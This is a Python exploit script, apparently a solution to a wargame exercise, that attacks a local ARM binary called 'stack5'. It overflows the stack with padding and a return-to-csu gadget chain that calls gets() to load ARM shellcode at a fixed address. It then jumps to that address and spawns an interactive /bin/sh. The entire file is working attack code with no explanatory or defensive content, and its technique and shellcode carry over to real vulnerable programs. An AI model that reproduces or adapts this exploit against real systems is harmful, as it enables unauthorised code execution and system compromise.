import struct, time
from subprocess import Popen, PIPE
 
def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
 
# main

shellcode = "\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\x01\x01\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

gets_plt = 0x000102c4

'''
   10488:	e1a00007 	mov	r0, r7
   1048c:	e1a01008 	mov	r1, r8
   10490:	e1a02009 	mov	r2, r9
   10494:	e12fff33 	blx	r3
   10498:	e1540006 	cmp	r4, r6
   1049c:	1afffff7 	bne	10480 <__libc_csu_init+0x38>
   104a0:	e8bd83f8 	pop	{r3, r4, r5, r6, r7, r8, r9, pc}
'''
libc_csu1 = 0x104a0
libc_csu2 = 0x10488

buf = "A"*68
buf += p(libc_csu1)
buf += p(gets_plt)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0x20000)
buf += p(0)
buf += p(0)
buf += p(libc_csu2)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0x20000)

s = Popen(['./stack5'], stdin=PIPE, stdout=PIPE)
s.stdin.write(buf + '\n')
time.sleep(0.5)
s.stdin.write(shellcode + '\n')
time.sleep(0.5)
s.stdin.write('exec /bin/sh <&2 >&2\n')
s.wait()
